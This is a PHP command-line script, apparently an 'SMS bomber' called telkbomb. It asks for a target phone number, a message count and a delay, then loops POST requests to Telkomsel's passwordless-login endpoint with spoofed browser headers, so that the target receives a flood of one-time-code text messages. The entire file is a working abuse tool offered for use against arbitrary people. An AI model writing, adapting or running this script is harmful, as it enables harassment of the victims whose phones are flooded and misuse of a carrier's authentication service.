<?php
function telkbomb($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        print($server_output)."\n";
        sleep($wait);
        $x++;
    }
}

echo "\033[0;31m╔╦╗╔═╗╔═╗╦   ╔═╗╔═╗╔═╗╔═╗ \n";
echo " ║ ╚═╗║╣ ║───╠═╣╠═╝╠═╝╚═╗ \n";
echo " ╩ ╚═╝╚═╝╩═╝ ╩ ╩╩  ╩  ╚═╝ \n";
echo "   \033[0;32m Modified by まやちゃん \n";
echo "\033[0mThanks to https://github.com/dandyraka \n";
echo "\n";
echo "Nomor Target (ex : 08xxx) : ";
$nomor = trim(fgets(STDIN));
echo "Jumlah Pesan : ";
$jumlah = trim(fgets(STDIN));
echo "delay : ";
$wait = trim(fgets(STDIN));
$execute = telkbomb($nomor, $jumlah, $wait);
print $execute;
?>
